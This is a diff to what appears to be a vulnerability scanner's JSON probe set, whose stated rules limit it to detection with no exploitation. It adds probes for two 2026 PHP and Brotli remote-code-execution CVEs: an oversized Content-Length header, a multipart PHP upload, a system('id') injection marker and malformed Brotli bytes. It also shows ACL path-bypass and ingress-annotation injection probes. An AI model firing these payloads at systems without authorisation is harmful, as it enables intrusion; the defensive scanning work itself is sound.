@@ -4,7 +4,7 @@
     "DETECTION-ONLY. Confirm RCE preconditions; do NOT exploit. Operator runs the destructive step manually.",
     "Per Rule 5/7: no DROP, no rm, no real exfil. Use server-internal reads (version, current_user, hostname) and OOB callbacks (Collaborator) to confirm reachability.",
     "Each probe answers ONE question: is the vulnerable feature reachable / privilege available / parser version exposed. Save with vuln_type='potential_rce'; downgrade to confirmed only after human-supervised exploitation.",
-    "Use confidence_boost <= 60 — detection of precondition is HIGH but not CRITICAL until exploit step confirms.",
+    "Use confidence_boost <= 60 \u2014 detection of precondition is HIGH but not CRITICAL until exploit step confirms.",
     "When OOB needed: replace {{collaborator}} with real Burp Collaborator URL (Rule 9a). Never hardcode."
   ],
   "contexts": {
@@ -948,7 +948,7 @@
       "probes": [
         {
           "payload": "{{baseline}}",
-          "description": "GET /%252e%252e/admin/users — front-end ACL allows /public/*, back-end resolves to /admin/users",
+          "description": "GET /%252e%252e/admin/users \u2014 front-end ACL allows /public/*, back-end resolves to /admin/users",
           "matchers": [
             {
               "type": "status",
@@ -973,7 +973,7 @@
         },
         {
           "payload": "{{baseline}}",
-          "description": "GET /public/.;/admin — semicolon segmenter bypass",
+          "description": "GET /public/.;/admin \u2014 semicolon segmenter bypass",
           "matchers": [
             {
               "type": "status",
@@ -1008,7 +1008,7 @@
       "probes": [
         {
           "payload": "{\"apiVersion\":\"networking.k8s.io/v1\",\"kind\":\"Ingress\",\"metadata\":{\"annotations\":{\"nginx.ingress.kubernetes.io/configuration-snippet\":\"# {{collaborator}}\"}}}",
-          "description": "POST to admission webhook with injected configuration-snippet — DNS callback confirms server-side eval",
+          "description": "POST to admission webhook with injected configuration-snippet \u2014 DNS callback confirms server-side eval",
           "matchers": [
             {
               "type": "collaborator",
@@ -1024,6 +1024,97 @@
             "content_type": "application/json",
             "manual_chain": true
           }
+        }
+      ]
+    },
+    "php_php2shell_2026": {
+      "description": "CVE-2026-109618/109619: PHP memory corruption in OOM handler + UAF between requests. Affects PHP-FPM, mod_php, php-cgi, FrankenPHP, LiteSpeed. CVSS 9.2.",
+      "tech_match": [
+        "php",
+        "laravel",
+        "wordpress",
+        "drupal",
+        "symfony",
+        "codeigniter"
+      ],
+      "probes": [
+        {
+          "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+          "description": "Send oversized Content-Length header (claims 2GB body, sends 50 bytes) to trigger PHP OOM path. Fatal error in OOM handler leaks stack or triggers the corruption.",
+          "inject_as": "header",
+          "inject_header": "Content-Length",
+          "inject_value": "2147483647",
+          "matchers": [
+            {
+              "type": "status",
+              "status": 500
+            },
+            {
+              "type": "regex",
+              "pattern": "Fatal error|memory|Allowed memory size|Segmentation fault|zend_mm_heap"
+            }
+          ]
+        },
+        {
+          "payload": "--boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n--boundary--",
+          "description": "Multipart upload with crafted boundary to trigger UAF in request-state cleanup. Response containing phpinfo output confirms code execution.",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "phpinfo|PHP Version|Configuration|php\\.ini"
+            },
+            {
+              "type": "status",
+              "status": 200
+            }
+          ]
+        },
+        {
+          "payload": "<?php system(\"id\"); ?>",
+          "description": "Classic PHP code injection marker \u2014 if the OOM/UAF corruption allows writing to a temporary file that gets included, this executes. Confirm with uid= in response.",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "uid=\\d+"
+            }
+          ]
+        }
+      ]
+    },
+    "brotli_decoder_oob_write_2026": {
+      "description": "CVE-2026-111497 (Broccoli2Shell): Pre-auth OOB write in Brotli decoder. Malformed br-encoded body triggers heap corruption in .NET, Node.js, Python, PHP. CVSS 9.2.",
+      "probes": [
+        {
+          "payload": "test",
+          "description": "Send request with Content-Encoding: br and a truncated/malformed Brotli stream. A 500 with brotli/decompress error confirms the decoder is reachable and may be vulnerable.",
+          "inject_as": "header",
+          "inject_header": "Content-Encoding",
+          "inject_value": "br",
+          "matchers": [
+            {
+              "type": "status",
+              "status": 500
+            },
+            {
+              "type": "regex",
+              "pattern": "brotli|decompress|BrotliDecode|InvalidDataException|zlib"
+            }
+          ]
+        },
+        {
+          "payload": "\u001b\u0000\u0000\u0000",
+          "description": "Minimal malformed Brotli header (window size byte + truncated stream). Triggers OOB read/write in vulnerable decoders.",
+          "inject_as": "body_raw",
+          "matchers": [
+            {
+              "type": "status",
+              "status": 500
+            },
+            {
+              "type": "regex",
+              "pattern": "brotli|corrupt|decompress|heap"
+            }
+          ]
         }
       ]
     }
